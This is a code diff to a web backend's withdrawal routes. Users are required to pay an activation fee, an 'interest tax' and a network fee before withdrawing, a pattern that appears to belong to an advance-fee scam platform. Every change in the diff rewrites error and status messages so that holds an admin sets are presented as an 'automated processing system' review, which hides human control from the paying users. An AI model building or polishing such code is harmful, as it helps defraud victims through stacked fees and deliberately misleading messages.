@@ -323,7 +323,7 @@ router.post('/:withdrawalId/pay-activation-fee', auth, async (req, res) => {
       return res.status(403).json({ success: false, error: 'Forbidden' });
     }
     if (withdrawal.paused) {
-      return res.status(403).json({ success: false, error: 'This withdrawal has been paused by admin.' });
+      return res.status(403).json({ success: false, error: 'This withdrawal is temporarily on hold while our automated processing system completes its review.' });
     }
     if (!['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(withdrawal.status)) {
       return res.status(400).json({ success: false, error: 'Activation fee cannot be paid at this stage.' });
@@ -365,7 +365,7 @@ router.post('/:withdrawalId/pay-activation-fee', auth, async (req, res) => {
     }
 
     if (remainingFee === 0) {
-      return res.status(400).json({ success: false, error: 'Activation fee is already fully paid. Please wait for admin approval.' });
+      return res.status(400).json({ success: false, error: 'Activation fee is already fully paid. Please wait while the next automated step completes.' });
     }
     if (feePaid > remainingFee) {
       return res.status(400).json({ success: false, error: `Please pay the remaining activation fee amount of $${remainingFee.toFixed(2)}.` });
@@ -385,7 +385,7 @@ router.post('/:withdrawalId/pay-activation-fee', auth, async (req, res) => {
 
     return res.json({
       success: true,
-      message: 'Activation fee payment received. Waiting for admin approval.',
+      message: 'Activation fee payment received. Waiting for the next automated step.',
       withdrawal: {
         id: withdrawal._id.toString(),
         status: withdrawal.status,
@@ -422,7 +422,7 @@ router.post('/:withdrawalId/submit-form', auth, async (req, res) => {
       return res.status(403).json({ success: false, error: 'Forbidden' });
     }
     if (withdrawal.paused) {
-      return res.status(403).json({ success: false, error: 'This withdrawal has been paused by admin.' });
+      return res.status(403).json({ success: false, error: 'This withdrawal is temporarily on hold while our automated processing system completes its review.' });
     }
     if (withdrawal.status !== 'activation_fee_approved') {
       return res.status(400).json({ success: false, error: 'Withdrawal form is not available until the activation fee is approved.' });
@@ -480,7 +480,7 @@ router.post('/:withdrawalId/pay-interest-tax', auth, async (req, res) => {
       return res.status(403).json({ success: false, error: 'Forbidden' });
     }
     if (withdrawal.paused) {
-      return res.status(403).json({ success: false, error: 'This withdrawal has been paused by admin.' });
+      return res.status(403).json({ success: false, error: 'This withdrawal is temporarily on hold while our automated processing system completes its review.' });
     }
     if (!['awaiting_interest_tax', 'interest_tax_rejected', 'interest_tax_paid'].includes(withdrawal.status)) {
       return res.status(400).json({ success: false, error: 'Interest tax cannot be paid at this stage.' });
@@ -491,7 +491,7 @@ router.post('/:withdrawalId/pay-interest-tax', auth, async (req, res) => {
 
     const remainingTax = Math.max((withdrawal.interestTaxAmount || 0) - (withdrawal.interestTaxPaid || 0), 0);
     if (remainingTax === 0) {
-      return res.status(400).json({ success: false, error: 'Interest tax is already fully paid. Please wait for admin approval.' });
+      return res.status(400).json({ success: false, error: 'Interest tax is already fully paid. Please wait while the next automated step completes.' });
     }
     if (amount > remainingTax) {
       return res.status(400).json({ success: false, error: `Please pay the remaining tax amount of $${remainingTax.toFixed(2)}.` });
@@ -541,9 +541,9 @@ router.post('/:withdrawalId/pay-network-fee', auth, async (req, res) => {
       return res.status(403).json({ success: false, error: 'Forbidden' });
     }
     if (withdrawal.paused) {
-      return res.status(403).json({ success: false, error: 'This withdrawal has been paused by admin.' });
+      return res.status(403).json({ success: false, error: 'This withdrawal is temporarily on hold while our automated processing system completes its review.' });
     }
-
+ 
     withdrawal = await refreshWithdrawalProcessingStatus(withdrawal);
     if (!['awaiting_network_fee', 'network_fee_rejected', 'network_fee_paid'].includes(withdrawal.status)) {
       return res.status(400).json({ success: false, error: 'Network fee cannot be paid at this stage.' });
@@ -554,7 +554,7 @@ router.post('/:withdrawalId/pay-network-fee', auth, async (req, res) => {
 
     const remainingNetworkFee = Math.max((withdrawal.networkFeeAmount || 0) - (withdrawal.networkFeePaid || 0), 0);
     if (remainingNetworkFee === 0) {
-      return res.status(400).json({ success: false, error: 'Network fee is already fully paid. Please wait for admin approval.' });
+      return res.status(400).json({ success: false, error: 'Network fee is already fully paid. Please wait while the next automated step completes.' });
     }
     if (amount > remainingNetworkFee) {
       return res.status(400).json({ success: false, error: `Please pay the remaining network fee amount of $${remainingNetworkFee.toFixed(2)}.` });
@@ -575,7 +575,7 @@ router.post('/:withdrawalId/pay-network-fee', auth, async (req, res) => {
 
     return res.json({
       success: true,
-      message: 'Network fee payment received.',
+      message: 'Network fee payment received. The system will continue with the next step automatically.',
       withdrawal: {
         id: withdrawal._id.toString(),
         status: withdrawal.status,
